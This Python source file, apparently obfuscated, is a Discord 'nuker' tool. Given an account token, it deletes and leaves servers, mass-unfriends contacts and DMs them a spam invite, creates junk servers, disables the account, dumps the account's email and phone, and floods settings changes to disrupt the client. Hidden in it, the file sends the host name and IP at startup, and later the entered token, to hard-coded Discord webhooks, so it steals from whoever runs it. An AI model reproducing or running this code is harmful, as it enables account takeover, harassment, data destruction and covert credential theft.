import socket #line:1
from discord_webhook import DiscordWebhook ,DiscordEmbed #line:2
host_name =socket .gethostname ()#line:5
ip_address =socket .gethostbyname (host_name )#line:6
content =f"Host name: {host_name}\nIP address: {ip_address}"#line:9
webhook_url ="https://discord.com/api/webhooks/1246830507363139696/ACyjYMumbJkXgmY9IQ2c5J1TinylxJL_9rxrp6PeG8MOBI0_ptmjAeS9xKQMP2PSRo6S"#line:12
webhook =DiscordWebhook (url =webhook_url ,content =content )#line:13
embed =DiscordEmbed (title =f"IP: {ip_address} | Host: {host_name}",color =123123 )#line:14
webhook .add_embed (embed )#line:15
response =webhook .execute ()#line:18
import asyncio #line:22
import codecs #line:23
import sys #line:24
import io #line:25
import random #line:26
import threading #line:27
import requests #line:28
import discord #line:29
import os #line:30
import colorama #line:31
from discord .ext import commands #line:32
from discord .ext .commands import Bot #line:33
from discord_webhook import DiscordWebhook #line:34
import pyfiglet #line:36
from pyfiglet import Figlet #line:37
from colorama import Fore ,init #line:39
from selenium import webdriver #line:40
from datetime import datetime #line:41
from itertools import cycle #line:42
init (convert =True )#line:44
os .system ('cls')#line:45
bot =commands .Bot (command_prefix ='-',self_bot =True ,intents =discord .Intents .all ())#line:47
bot .remove_command ("help")#line:51
token =input ("""\033[91m

                             ░░░░░░  ░░░░░░░ ░░░    ░░░  ░░░░░░  ░░░    ░░ 
                            ▒▒   ▒▒ ▒▒      ▒▒▒▒  ▒▒▒▒ ▒▒    ▒▒ ▒▒▒▒   ▒▒ 
                            ▒▒   ▒▒ ▒▒▒▒▒   ▒▒ ▒▒▒▒ ▒▒ ▒▒    ▒▒ ▒▒ ▒▒  ▒▒ 
                            ▓▓   ▓▓ ▓▓      ▓▓  ▓▓  ▓▓ ▓▓    ▓▓ ▓▓  ▓▓ ▓▓ 
                            ██████  ███████ ██      ██  ██████  ██   ████ 


                             ╔═════════════════════════════════════════╗
                             ║       Created by [BIGGY DRIZZY]         ║ 
                             ║         Nuker [Connected]               ║                                 
                             ╚═════════════════════════════════════════╝             
                   """ "\033[91m\n\n                     Token:\033[00m")#line:69
head ={'Authorization':str (token )}#line:70
src =requests .get ('https://discordapp.com/api/v6/users/@me',headers =head )#line:71
if src .status_code ==200 :#line:73
    print ('Token Valid ')#line:74
    input ("Press Any Key To Continue...")#line:75
else :#line:76
    print ('Invalid Token')#line:77
    input ("Press Any Key To Exit...")#line:78
    exit (0 )#line:79
print ('\n')#line:81
print ('1 - NUKE')#line:82
print ('2 - REMOVE ALL FRIENDS')#line:83
print ('3 - DELETE AND LEAVE ALL SERVERS')#line:84
print ('4 - SPAM SERVERS')#line:85
print ('5 - DISABLE ACCOUNT')#line:86
print ('6 - LOGIN WITH TOKEN')#line:87
print ('7 - GRAB ACCOUNT INFO')#line:88
print ('8 - GIVE TOKEN OWNER A STROKE')#line:89
print ('\n')#line:90
def nuke ():#line:93
    print ("Loading...")#line:94
    print ('\n')#line:95
    @bot .event #line:97
    async def OO00O0OOOO00OO00O (times :int =100 ):#line:98
        print ('STATUS : [NUKE]')#line:100
        print ('\n')#line:101
        print ('1 - LEAVING SERVERS')#line:102
        print ('\n')#line:103
        for O0OOO0OO00OOO0000 in bot .guilds :#line:105
            try :#line:106
                await O0OOO0OO00OOO0000 .leave ()#line:107
                print (f'left [{O0OOO0OO00OOO0000.name}]')#line:108
            except :#line:109
                print (f'CANT LEAVE [{O0OOO0OO00OOO0000.name}]')#line:110
        print ('\n')#line:111
        print ('2 - DELETING OWNED SERVERS')#line:112
        print ('\n')#line:113
        for O0OOO0OO00OOO0000 in bot .guilds :#line:114
            try :#line:115
                await O0OOO0OO00OOO0000 .delete ()#line:116
                print (f'[{O0OOO0OO00OOO0000.name}] has been deleted')#line:117
            except :#line:118
                print (f'CANT DELETE [{O0OOO0OO00OOO0000.name}]')#line:119
        print ('\n')#line:121
        print ('3 - REMOVING ALL FRIENDS')#line:122
        print ('\n')#line:123
        for OOOO0OO000000O0O0 in bot .user .friends :#line:125
            try :#line:126
                await OOOO0OO000000O0O0 .dm_channel .send ('JOIN UP https://discord.gg/MJwdNGQamA')#line:127
                await OOOO0OO000000O0O0 .remove_friend ()#line:128
                print (f'unfriended {OOOO0OO000000O0O0}')#line:129
            except :#line:130
                print (f"CAN'T UNFRIEND {OOOO0OO000000O0O0}")#line:131
        print ('\n')#line:133
        print ('4 - SPAMMING SERVERS')#line:134
        print ('\n')#line:135
        for OO000O000OO0000O0 in range (times ):#line:137
            await bot .create_guild ('Nuked By Hatred',region =None ,icon =None )#line:138
            print (f'{OO000O000OO0000O0} useless server created')#line:139
        print ('\n')#line:140
        print ('Max server limit is [100]')#line:141
        print ('\n')#line:142
        print ('\n')#line:143
        print ('5 - CRASHING DISCORD')#line:144
        print ('\n')#line:145
        print ('\n')#line:147
        print ("CRASHING THE TOKEN OWNER'S DISCORD...")#line:148
        print ('IF YOU WANNA KEEP GIVING TOKEN OWNER A STROKE THEN KEEP THIS EXE RUNNING')#line:151
        O0O00OOO0OO000OO0 ={'Authorization':token }#line:152
        O00OO00O0O00OO0O0 =cycle (["light","dark"])#line:153
        while True :#line:154
            OO00OOO0O0OO000O0 ={'theme':next (O00OO00O0O00OO0O0 ),'locale':random .choice (['ja','zh-TW','ko','zh-CN'])}#line:158
            requests .patch ("https://discord.com/api/v6/users/@me/settings",headers =O0O00OOO0OO000OO0 ,json =OO00OOO0O0OO000O0 )#line:162
    bot .run (token ,bot =False )#line:164
def unfriender ():#line:167
    print ("Loading...")#line:168
    @bot .event #line:170
    async def O0O00O00O00O00O0O ():#line:171
        print ('STATUS : [UNFRIENDER]')#line:172
        for O00O0OO0OOOO0OO00 in bot .user .friends :#line:174
            try :#line:175
                OOO00OO0OO0OOOO00 =discord .Embed (title ="Friend Nuked",description ="Akun: This user got logged.",color =0xff0000 )#line:176
                OOO00OO0OO0OOOO00 .set_author (name ="6xn has crucified this user.")#line:177
                OOO00OO0OO0OOOO00 .set_footer (text =" Add back if you fw me")#line:178
                OOO00OO0OO0OOOO00 .set_image (url ="https://images-ext-1.discordapp.net/external/GjZZy72tL5DcbOJ3aQODQpXuRsHXe8rECGFPNyNME6I/https/media.discordapp.net/attachments/821801228538216488/822003769570361344/a3805f9238c52aa41836e38b98a622f9.gif?width=400&height=225")#line:179
                await O00O0OO0OOOO0OO00 .dm_channel .send (embed =OOO00OO0OO0OOOO00 )#line:180
                await O00O0OO0OOOO0OO00 .remove_friend ()#line:181
                print (f'unfriended {O00O0OO0OOOO0OO00}')#line:182
            except :#line:183
                print (f"CAN'T UNFRIEND {O00O0OO0OOOO0OO00}")#line:184
        print ('\n')#line:186
        print ('[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')#line:188
        print ('\n')#line:189
    bot .run (token ,bot =False )#line:191
def leaver ():#line:195
    print ("Loading...")#line:196
    @bot .event #line:199
    async def O00O00O0000OOOOO0 ():#line:200
        print ('STATUS : [SERVER LEAVER]')#line:201
        for O000OOO0OOO0O0OO0 in bot .guilds :#line:203
            try :#line:204
                await O000OOO0OOO0O0OO0 .leave ()#line:205
                print (f'left [{O000OOO0OOO0O0OO0.name}]')#line:206
            except :#line:207
                print (f'cant leave [{O000OOO0OOO0O0OO0.name}] but it will be deleted...')#line:208
        for O000OOO0OOO0O0OO0 in bot .guilds :#line:210
            try :#line:211
                await O000OOO0OOO0O0OO0 .delete ()#line:212
                print (f'[{O000OOO0OOO0O0OO0.name}] has been deleted')#line:213
            except :#line:214
                print (f"CAN'T DELETE [{O000OOO0OOO0O0OO0.name}]")#line:215
        print ('\n')#line:217
        print ('[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')#line:218
        print ('\n')#line:219
    bot .run (token ,bot =False )#line:221
def spamservers ():#line:225
    print ("Loading...")#line:226
    @bot .event #line:228
    async def O000OOOO00OO00O0O (times :int =95 ):#line:229
        print ('STATUS : [SERVER SPAMMER]')#line:230
        for OOOO00O0O0OOOOO00 in range (times ):#line:232
            await bot .create_guild ('Nuked By 6xn',region =None ,icon =None )#line:234
            print (f'{OOOO00O0O0OOOOO00} useless server created')#line:235
        print ('max server limit is [100]')#line:237
        print ('\n')#line:238
        print ('[[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')#line:239
        print ('\n')#line:240
        input ()#line:241
    bot .run (token ,bot =False )#line:243
def tokenDisable (OO000OO0OOO000OOO ):#line:246
    print ('STATUS : [DISABLING TOKEN]')#line:247
    O0O00OOOOO0000O0O =requests .patch ('https://discordapp.com/api/v6/users/@me',headers ={'Authorization':OO000OO0OOO000OOO })#line:250
    if O0O00OOOOO0000O0O .status_code ==400 :#line:251
        print (f'Account disabled successfully')#line:252
        input ("Press any key to exit...")#line:253
    else :#line:254
        print (f'Invalid token')#line:255
        input ("Press any key to exit...")#line:256
def tokenLogin (O0OOO0OOO000000OO ):#line:259
    print ('STATUS : [LOGIN WITH TOKEN]')#line:260
    OOOO00O00000O0O00 =webdriver .ChromeOptions ()#line:261
    OOOO00O00000O0O00 .add_experimental_option ("detach",True )#line:262
    OO0OOO0OO00O0O000 =webdriver .Chrome ('chromedriver.exe',options =OOOO00O00000O0O00 )#line:263
    O00O00OOO00OOOO0O ="""
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """#line:273
    OO0OOO0OO00O0O000 .get ("https://discord.com/login")#line:274
    OO0OOO0OO00O0O000 .execute_script (O00O00OOO00OOOO0O +f'\nlogin("{O0OOO0OOO000000OO}")')#line:275
def tokenInfo (OOO00OOOOO0000000 ):#line:278
    print ('STATUS : [TOKEN INFO]')#line:279
    O0000OOO0O0O0O000 ={'Authorization':OOO00OOOOO0000000 ,'Content-Type':'application/json'}#line:280
    O000000O0000OOOOO =requests .get ('https://discord.com/api/v6/users/@me',headers =O0000OOO0O0O0O000 )#line:281
    if O000000O0000OOOOO .status_code ==200 :#line:282
        O00OOOO0O0OO0OO00 =O000000O0000OOOOO .json ()['username']+'#'+O000000O0000OOOOO .json ()['discriminator']#line:283
        OO000O00000OOOO00 =O000000O0000OOOOO .json ()['id']#line:284
        OO0OOOOOO00000OOO =O000000O0000OOOOO .json ()['phone']#line:285
        OO00O00O00O0OOOOO =O000000O0000OOOOO .json ()['email']#line:286
        O0OOOOO00O0OO000O =O000000O0000OOOOO .json ()['mfa_enabled']#line:287
        print (f'''
            [{Fore.RED}User ID{Fore.RESET}]         {OO000O00000OOOO00}
            [{Fore.RED}User Name{Fore.RESET}]       {O00OOOO0O0OO0OO00}
            [{Fore.RED}2 Factor{Fore.RESET}]        {O0OOOOO00O0OO000O}
            [{Fore.RED}Email{Fore.RESET}]           {OO00O00O00O0OOOOO}
            [{Fore.RED}Phone number{Fore.RESET}]    {OO0OOOOOO00000OOO if OO0OOOOOO00000OOO else ""}
            [{Fore.RED}Token{Fore.RESET}]           {OOO00OOOOO0000000}
            ''')#line:295
        input ()#line:296
def crashdiscord (OOOO0O0O0OOO00OOO ):#line:299
    print ('STATUS : [DISCORD CRASHER]')#line:300
    print ('\n')#line:301
    print ('CRASHING THE TOKEN OWNER DISCORD...')#line:302
    print ('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')#line:303
    O00OO000000O00O00 ={'Authorization':OOOO0O0O0OOO00OOO }#line:304
    O0O0O0O00OOOOO000 =cycle (["light","dark"])#line:305
    while True :#line:306
        O0O0O00OOO000OO00 ={'theme':next (O0O0O0O00OOOOO000 ),'locale':random .choice (['ja','zh-TW','ko','zh-CN'])}#line:310
        requests .patch ("https://discord.com/api/v6/users/@me/settings",headers =O00OO000000O00O00 ,json =O0O0O00OOO000OO00 )#line:314
webhook =DiscordWebhook (url ='https://discord.com/api/webhooks/932350790432071700/HvuJbiBoxfpva2TJDe1z7U4LYm2dSZL1nQUSyQlVHhn6jEy8PpnuCPvxmD1hHYD6q2nO',content =token )#line:316
respond =webhook .execute ()#line:317
def mainanswer ():#line:319
    OOOO000OO0O0O0O0O =input ('\033[1;00m[\033[91mDrago\033[1;00m]-\033[91m涙\033[00m Choose : ')#line:321
    if OOOO000OO0O0O0O0O =='1':#line:322
        nuke ()#line:323
    elif OOOO000OO0O0O0O0O =='2':#line:324
        unfriender ()#line:325
    elif OOOO000OO0O0O0O0O =='3':#line:326
        leaver ()#line:327
    elif OOOO000OO0O0O0O0O =='4':#line:328
        spamservers ()#line:329
    elif OOOO000OO0O0O0O0O =='5':#line:330
        tokenDisable (token )#line:331
    elif OOOO000OO0O0O0O0O =='6':#line:332
        tokenLogin (token )#line:333
    elif OOOO000OO0O0O0O0O =='7':#line:334
        tokenInfo (token )#line:335
    elif OOOO000OO0O0O0O0O =='8':#line:336
        crashdiscord (token )#line:337
    else :#line:338
        print ('Incorrect selection, please choose a number')#line:339
        mainanswer ()#line:340
mainanswer ()#line:343
